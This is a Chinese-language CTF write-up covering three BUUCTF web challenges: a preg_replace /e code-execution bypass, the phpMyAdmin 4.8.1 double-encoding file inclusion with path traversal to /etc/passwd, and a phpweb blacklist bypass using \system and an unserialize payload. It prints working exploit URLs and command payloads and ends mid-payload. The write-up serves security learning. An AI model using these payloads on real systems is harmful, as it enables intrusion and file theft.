<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,<span class="comment">//修正符:e 配合函数preg_replace()使用, 可以把匹配来的字符串当作表达式执行;</span></span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

很明显要我们绕过那个正则匹配，然后执行eval()函数
而我们要执行eval()函数，就是要通过getFlag()这个函数，而怎么取调用呢？
 把那个正则匹配表达式往上面一搜
[先知社区](https://xz.aliyun.com/t/2557)

对 `$_GET as $re => $str` 的理解：

这是一个动态赋值的过程，即会将get请求中的参数名作为键$re，参数对应的值作为键值$str

[加深理解题目](https://www.cnblogs.com/Sentry-fei/p/15476811.html)

正则表达式的\S：匹配所有非空白字符； .号：匹配除\n外的任意字符；
 *号：匹配前面的字符0次或者多次
 +号：匹配前面的字符1次或者多次（如果要在url里输入+号，必须要对其进行编码，+号编码为:%2b）

http://www.phpheidong.com/blog/article/293254/d7d2befb3f3d45314199/

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">http:<span class="regexp">//</span>ed976cac-<span class="number">0</span>fac-<span class="number">469</span>c-<span class="number">9</span>a5b-<span class="number">3</span>d124ca13654.node4.buuoj.cn:<span class="number">81</span><span class="regexp">/next.php?\S*=&#123;$&#123;getFlag()&#125;&#125;&amp;cmd=system(%27cat%20/</span>flag%<span class="number">27</span>);</span><br><span class="line">或者:</span><br><span class="line">http:<span class="regexp">//</span>ed976cac-<span class="number">0</span>fac-<span class="number">469</span>c-<span class="number">9</span>a5b-<span class="number">3</span>d124ca13654.node4.buuoj.cn:<span class="number">81</span><span class="regexp">/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(%27cat%20/</span>flag%<span class="number">27</span>);</span><br><span class="line"></span><br><span class="line">因为是在双引号中解析函数，所以用到 <span class="variable">$&#123;函数&#125;</span> 或者 &#123;<span class="variable">$&#123;函数&#125;</span>&#125;</span><br><span class="line">在<span class="variable">$&#123;&#125;</span>中可以调用函数</span><br></pre></td></tr></table></figure>

$与$&#123; &#125;都是用来引用变量的，只不过$&#123; &#125;可以指定变量边界，也可用于对[字符串](https://so.csdn.net/so/search?q=字符串&spm=1001.2101.3001.7020)变量进行截取等处理，具体用法可参考如下blog
 **[linux之$&#123;&#125;符号详解](https://blog.csdn.net/qq_43382735/article/details/121606145)**

**\1** 在正则表达式中有自己的含义，**\1** 实际上指定的是第一个子匹配项，也就是他自己

preg_replace()第一个参数是匹配的模式，第二个是要替换成的字符，第三个是被替换的字符串

所以就是\S*，匹配$&#123;getFlag()&#125;所有字符，替换成他自己，然后代码执行，调用getFlag函数

## [GWCTF 2019]我有一个数据库

扫描目录发现：

![image-20220509131318840](./buu/image-20220509131318840.png)

robots.txt打开是phpinfo.php

![image-20220509133048407](./buu/image-20220509133048407.png)

以及上面的，打开phpmyadmin得到：

![image-20220509133143430](./buu/image-20220509133143430.png)

由于phpmyadmin是4.8.1版本，有一个CVE漏洞

**漏洞原理**

官网下载的最新版，文件名是[phpMyAdmin-4.8.1-all-languages.zip](https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip)

首先在index.php 50-63行代码

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target_blacklist</span> = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>, <span class="string">&#x27;export.php&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we have a valid target, let&#x27;s load that script instead</span></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! in_array(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

满足5个条件后就会include$_REQUEST['target']的内容

    $_REQUEST['target']不为空
    $_REQUEST['target']是字符串
    $_REQUEST['target']不以index开头
    $_REQUEST['target']不在$target_blacklist中
    ‘import.php’, ‘export.php’
    Core::checkPageValidity($_REQUEST['target'])为真
    代码在libraries\classes\Core.php 443-476行
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

**$whitelist**一开始未传参过来，所以会被赋值为**self::$goto_whitelist**

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$goto_whitelist</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

如果$page在白名单中就会直接return true，但这里考虑到了可能带参数的情况，所以有了下面的判断

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = mb_substr(</span><br><span class="line">    <span class="variable">$page</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line"><span class="variable">$_page</span> = mb_substr(</span><br><span class="line">    <span class="variable">$_page</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mb_strpos ( <span class="built_in">string</span> $haystack , <span class="built_in">string</span> $needle [, <span class="built_in">int</span> $offset = <span class="number">0</span> [, <span class="built_in">string</span> $encoding = mb_internal_encoding() ]] ) : <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line">查找<span class="built_in">string</span>在一个tring中首次出现的位置。基于字符数执行一个多字节安全的strpos()操作。第一个字符的位置是<span class="number">0</span>，第二个字符的位置是<span class="number">1</span>，以此类推。</span><br><span class="line"></span><br><span class="line">$_page是取出$page问号前的东西，是考虑到target有参数的情况，只要$_page在白名单中就直接<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">但还考虑了url编码的情况，所以如果这步判断未成功，下一步又进行url解码</span><br><span class="line">        $_page = urldecode($page)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        )<span class="comment">;</span></span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span><span class="comment">;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

所以传入二次编码后的内容，会让checkPageValidity()这个函数返回true，但index中实际包含的内容却不是白名单中的文件
例如传入`?target=db_datadict.php%253f`
由于服务器会自动解码一次，所以在checkPageValidity()中，page的值一开始会是`db_datadict.php%3f`，又一次url解码后变成了`db_datadict.php?`，这次便符合了`?`前内容在白名单的要求，函数返回true 但在index.php中‘_REQUEST[‘target’]仍然是db_datadict.php%3f，而且会被include，通过目录穿越，就可造成任意文件包含。

本题的问题在于urldecode($page)方法，存在二次编码绕过

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">%<span class="number">25</span>的url编码为%</span><br><span class="line">%<span class="number">3</span>f的url编码为?</span><br><span class="line">%<span class="number">253</span>f--&gt;?</span><br><span class="line"></span><br><span class="line">payLoad：</span><br><span class="line">这里target参数只要不是黑名单中php文件就可以</span><br><span class="line"><span class="regexp">/phpmyadmin/i</span>ndex.php?target=db_datadict.php%<span class="number">253</span>f..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>etc/passwd</span><br><span class="line"></span><br><span class="line">flag应该位于系统的根目录，是这个</span><br><span class="line"><span class="regexp">/phpmyadmin/i</span>ndex.php?target=db_datadict.php%<span class="number">253</span>f..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>flag</span><br></pre></td></tr></table></figure>

## [网鼎杯 2020 朱雀组]phpweb

![image-20220510144522083](./buu/image-20220510144522083.png)

接收到func和p，执行PHP内的date函数和格式化的Y-m-d h:i:s a，然后输出结果。既然这样，猜想一下在PHP内，执行$func="date"，肯定是没有问题的，但是如果提交的不是date，而是system，或exec呢？不妨用php内的md5函数测试一下，123经过md5加密后的值为202cb962ac59075b964b07152d234b70，如果成功执行回显在网页上，猜测就正确

![image-20220510144600721](./buu/image-20220510144600721.png)

system等被拦截了

这里可以利用file_get_contents获取index.php的源码

![image-20220510144728289](./buu/image-20220510144728289.png)

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);<span class="comment">//调调用传递函数，并返回函数运行的结果（本例中即为执行$func($p)）</span></span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;<span class="comment">//非空</span></span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);<span class="comment">//转小写</span></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;<span class="comment">//判断是否存在黑名单</span></span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);<span class="comment">//如果不存在则调用gettime，把funchep传入</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);<span class="comment">//报错</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

方法一:

php内的" \ "转义字符在做代码执行的时候，会识别特殊字符串，绕过黑名单

payload：?func=\system&p=find / -name flag*

payload：?func=\system&p=cat /tmp/flagoefiu4r93

![image-20220510145853724](./buu/image-20220510145853724.png)

方法二：

反序列化得flag手段

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">       <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;<span class="comment">//定义p和func</span></span><br><span class="line">       <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;<span class="comment">//对象被创建时自动调用</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">               <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">           &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

提交的func为unserialize，p为序列化后的字符串，然后反序列化test类

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span>-&gt;func=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;p=<span class="string">&quot;find / -name flag*&quot;</span>;  <span class="comment">//$a-&gt;p=&quot;cat /tmp/flagoefiu4r93&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">payload:</span><br><span class="line">/index.php?func=unserialize&amp;p=O%<span class="number">3</span>A4%<span class="number">3</span>A<span class="string">&quot;Test&quot;</span>%<span 